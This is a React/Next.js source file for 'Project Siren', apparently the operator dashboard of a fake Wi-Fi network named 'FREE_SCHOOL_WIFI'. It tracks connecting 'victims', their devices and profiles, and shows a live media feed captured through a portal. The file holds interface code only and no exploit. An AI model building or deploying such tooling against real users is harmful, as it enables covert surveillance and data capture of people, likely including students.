"use client";

import { useEffect, useState, useCallback, useMemo } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { HoloPanel } from "@/components/ui";
import {
    RadarSweep,
    TrafficLog,
    AdminLogin,
    CurrentVictimPanel,
    LiveFeedPanel,
} from "@/components/admin";
import { Victim, VictimProfile, MediaCapture } from "@/lib/sessions";
import styles from "./page.module.css";

/**
 * Admin Dashboard Page
 * 
 * SOC-style command center with real-time victim tracking,
 * radar visualization, traffic logs, and device analytics.
 * 
 * Hollywood-inspired futuristic design.
 */

interface DashboardStats {
    count: number;
    deviceBreakdown: {
        iOS: number;
        Android: number;
        Desktop: number;
        Unknown: number;
    };
    recentVictims: Victim[];
}

interface ParticleData {
    x: number;
    y: number;
    targetY: number;
    duration: number;
    delay: number;
}

export default function AdminDashboard() {
    const [stats, setStats] = useState<DashboardStats>({
        count: 0,
        deviceBreakdown: { iOS: 0, Android: 0, Desktop: 0, Unknown: 0 },
        recentVictims: [],
    });
    const [connected, setConnected] = useState(false);
    const [currentTime, setCurrentTime] = useState<Date | null>(null);
    const [particles, setParticles] = useState<ParticleData[]>([]);
    const [isClient, setIsClient] = useState(false);
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [currentVictim, setCurrentVictim] = useState<VictimProfile | undefined>(undefined);
    const [mediaData, setMediaData] = useState<MediaCapture | undefined>(undefined);
    const router = useRouter();

    // Session key for authentication - changes on each app load
    const SESSION_KEY = "siren_admin_session";
    const SESSION_TOKEN = "authenticated_" + Date.now().toString(36);

    // Handle authentication with session management
    const handleAuthenticated = useCallback(() => {
        // Store session in sessionStorage (clears on tab close/refresh)
        if (typeof window !== 'undefined') {
            sessionStorage.setItem(SESSION_KEY, SESSION_TOKEN);
            // Replace current history entry to prevent back button
            window.history.replaceState({ authenticated: true }, '', '/admin');
        }
        setIsAuthenticated(true);
    }, [SESSION_KEY, SESSION_TOKEN]);

    // Handle logout with security measures
    const handleLogout = useCallback(() => {
        if (typeof window !== 'undefined') {
            // Clear session
            sessionStorage.removeItem(SESSION_KEY);
            // Clear all history and replace with login state
            window.history.replaceState({ authenticated: false }, '', '/admin');
            // Prevent back button by pushing multiple entries
            window.history.pushState(null, '', '/admin');
            window.history.pushState(null, '', '/admin');
        }
        setIsAuthenticated(false);
    }, [SESSION_KEY]);

    // Initialize client-only state and check session
    useEffect(() => {
        setIsClient(true);
        setCurrentTime(new Date());

        // Check if session exists (prevents access without login)
        // Note: sessionStorage clears on refresh/tab close for security
        const storedSession = sessionStorage.getItem(SESSION_KEY);
        if (storedSession) {
            // Session exists but we invalidate on refresh for security
            sessionStorage.removeItem(SESSION_KEY);
        }

        // Prevent back button navigation after logout
        const handlePopState = () => {
            if (!sessionStorage.getItem(SESSION_KEY)) {
                setIsAuthenticated(false);
                // Push state again to prevent back navigation
                window.history.pushState(null, '', '/admin');
            }
        };

        window.addEventListener('popstate', handlePopState);

        // Generate particles only on client to avoid hydration mismatch
        const newParticles: ParticleData[] = Array.from({ length: 30 }).map(() => ({
            x: Math.random() * 100,
            y: Math.random() * 100,
            targetY: Math.random() * -50 - 50,
            duration: Math.random() * 10 + 10,
            delay: Math.random() * 5,
        }));
        setParticles(newParticles);

        return () => {
            window.removeEventListener('popstate', handlePopState);
        };
    }, [SESSION_KEY]);

    // Fetch initial stats
    const fetchStats = useCallback(async () => {
        try {
            const res = await fetch("/api/stats");
            if (res.ok) {
                const data = await res.json();
                setStats(data);
            }
        } catch (error) {
            console.error("Failed to fetch stats:", error);
        }
    }, []);

    // Initial load
    useEffect(() => {
        fetchStats();
    }, [fetchStats]);

    // SSE connection for real-time updates
    useEffect(() => {
        const eventSource = new EventSource("/api/events");

        eventSource.onopen = () => {
            setConnected(true);
        };

        eventSource.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);

                if (data.type === "connected" || data.type === "ping") {
                    return;
                }

                // Current victim profile update
                if (data.type === "current_victim" && data.profile) {
                    setCurrentVictim(data.profile);
                    return;
                }

                // Media update from portal
                if (data.type === "media_update" && data.media) {
                    setMediaData(data.media);
                    return;
                }

                // Check if this is a VictimProfile (has sessionId)
                if (data.sessionId) {
                    setCurrentVictim(data);
                }

                // New victim - update stats (handle both legacy Victim and VictimProfile)
                const deviceType = data.device?.type || data.device;
                setStats((prev) => ({
                    count: prev.count + 1,
                    deviceBreakdown: {
                        ...prev.deviceBreakdown,
                        [deviceType]: (prev.deviceBreakdown[deviceType as keyof typeof prev.deviceBreakdown] || 0) + 1,
                    },
                    recentVictims: [...prev.recentVictims, data].slice(-20),
                }));
            } catch {
                // Ignore parse errors
            }
        };

        eventSource.onerror = () => {
            setConnected(false);
        };

        return () => {
            eventSource.close();
        };
    }, []);

    // Update time every second
    useEffect(() => {
        const timer = setInterval(() => {
            setCurrentTime(new Date());
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const formatDate = (date: Date) => {
        return date.toLocaleDateString("en-US", {
            weekday: "short",
            month: "short",
            day: "numeric",
            year: "numeric",
        });
    };

    const formatTime = (date: Date) => {
        return date.toLocaleTimeString("en-US", {
            hour12: false,
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
        });
    };

    // Show login screen if not authenticated
    if (!isAuthenticated) {
        return <AdminLogin onAuthenticated={handleAuthenticated} />;
    }

    return (
        <div className={styles.container}>
            {/* Animated background grid */}
            <div className={styles.gridBackground}>
                <div className={styles.gridPerspective} />
                <div className={styles.gridGlow} />
            </div>

            {/* Floating particles - only render on client */}
            {isClient && (
                <div className={styles.particles}>
                    {particles.map((particle, i) => (
                        <motion.div
                            key={i}
                            className={styles.particle}
                            initial={{
                                x: `${particle.x}%`,
                                y: `${particle.y}%`,
                                opacity: 0,
                            }}
                            animate={{
                                y: [null, `${particle.targetY}%`],
                                opacity: [0, 0.5, 0],
                            }}
                            transition={{
                                duration: particle.duration,
                                repeat: Infinity,
                                delay: particle.delay,
                            }}
                        />
                    ))}
                </div>
            )}

            {/* Main dashboard */}
            <main className={styles.main}>
                {/* Header */}
                <header className={styles.header}>
                    <div className={styles.headerLeft}>
                        <h1 className={styles.title}>
                            <span className={styles.titleIcon}>🎯</span>
                            <span className={styles.titleText}>PROJECT SIREN</span>
                        </h1>
                        <div className={styles.subtitle}>NETWORK OPERATIONS CENTER</div>
                    </div>

                    <div className={styles.headerCenter}>
                        <div className={styles.statusBar}>
                            <motion.div
                                className={`${styles.statusDot} ${connected ? styles.connected : styles.disconnected}`}
                                animate={{
                                    scale: connected ? [1, 1.2, 1] : 1,
                                }}
                                transition={{ duration: 1, repeat: Infinity }}
                            />
                            <span className={styles.statusText}>
                                {connected ? "LIVE" : "OFFLINE"}
                            </span>
                        </div>
                    </div>

                    <div className={styles.headerRight}>
                        <div className={styles.datetime} suppressHydrationWarning>
                            <div className={styles.time} suppressHydrationWarning>
                                {currentTime ? formatTime(currentTime) : "--:--:--"}
                            </div>
                            <div className={styles.date} suppressHydrationWarning>
                                {currentTime ? formatDate(currentTime) : "---"}
                            </div>
                        </div>

                        {/* Logout Button */}
                        <motion.button
                            className={styles.logoutBtn}
                            onClick={handleLogout}
                            whileHover={{ scale: 1.05 }}
                            whileTap={{ scale: 0.95 }}
                        >
                            <span className={styles.logoutIcon}>⏻</span>
                            <span className={styles.logoutText}>LOGOUT</span>
                            <div className={styles.logoutGlow} />
                        </motion.button>
                    </div>
                </header>

                {/* Dashboard grid */}
                <div className={styles.dashboardGrid}>
                    {/* Radar - left side */}
                    <motion.div
                        className={styles.radarPanel}
                        initial={{ x: -50, opacity: 0 }}
                        animate={{ x: 0, opacity: 1 }}
                        transition={{ delay: 0.2 }}
                    >
                        <HoloPanel title="Network Radar" icon="📡" size="full" animate={false}>
                            <div className={styles.radarContainer}>
                                <RadarSweep deviceCount={stats.count} size={200} />
                            </div>
                        </HoloPanel>
                    </motion.div>

                    {/* Live Feed Panel - CENTER (prominent) */}
                    <motion.div
                        className={styles.livePanel}
                        initial={{ scale: 0.95, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        transition={{ delay: 0.1 }}
                    >
                        <LiveFeedPanel media={mediaData} />
                    </motion.div>

                    {/* Current Target Panel - right side */}
                    <motion.div
                        className={styles.victimPanel}
                        initial={{ x: 50, opacity: 0 }}
                        animate={{ x: 0, opacity: 1 }}
                        transition={{ delay: 0.35 }}
                    >
                        <CurrentVictimPanel victim={currentVictim} />
                    </motion.div>

                    {/* Connection Log - bottom */}
                    <motion.div
                        className={styles.logPanel}
                        initial={{ y: 50, opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        transition={{ delay: 0.4 }}
                    >
                        <HoloPanel title="Connection Log" icon="📋" size="full" animate={false}>
                            <TrafficLog entries={stats.recentVictims} />
                        </HoloPanel>
                    </motion.div>
                </div>

                {/* Bottom status bar */}
                <footer className={styles.footer}>
                    <div className={styles.footerItem}>
                        <span className={styles.footerLabel}>GATEWAY</span>
                        <span className={styles.footerValue}>10.0.0.1</span>
                    </div>
                    <div className={styles.footerItem}>
                        <span className={styles.footerLabel}>SSID</span>
                        <span className={styles.footerValue}>FREE_SCHOOL_WIFI</span>
                    </div>
                    <div className={styles.footerItem}>
                        <span className={styles.footerLabel}>UPTIME</span>
                        <span className={styles.footerValue}>ACTIVE</span>
                    </div>
                    <div className={styles.footerItem}>
                        <span className={styles.footerLabel}>VERSION</span>
                        <span className={styles.footerValue}>1.0.0</span>
                    </div>
                </footer>
            </main>

            {/* Corner decorations */}
            <div className={styles.cornerTL} />
            <div className={styles.cornerTR} />
            <div className={styles.cornerBL} />
            <div className={styles.cornerBR} />

            {/* Scanlines */}
            <div className={styles.scanlines} />
        </div>
    );
}
